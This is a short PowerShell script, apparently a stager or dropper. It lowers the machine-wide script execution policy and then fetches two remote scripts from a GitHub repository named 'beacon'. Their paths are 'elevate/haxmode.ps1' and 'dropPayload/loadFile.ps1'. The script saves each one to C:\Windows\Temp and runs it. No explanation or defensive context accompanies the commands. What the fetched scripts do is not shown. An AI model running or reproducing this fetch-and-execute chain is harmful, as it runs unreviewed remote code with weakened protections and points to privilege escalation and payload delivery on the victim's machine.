Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine -Force;  
Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/haxmode.ps1 > C:\Windows\Temp\mode.ps1;  
C:\Windows\Temp\mode.ps1;
Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/dropPayload/loadFile.ps1 > C:\Windows\Temp\start.ps1;  
C:\Windows\Temp\start.ps1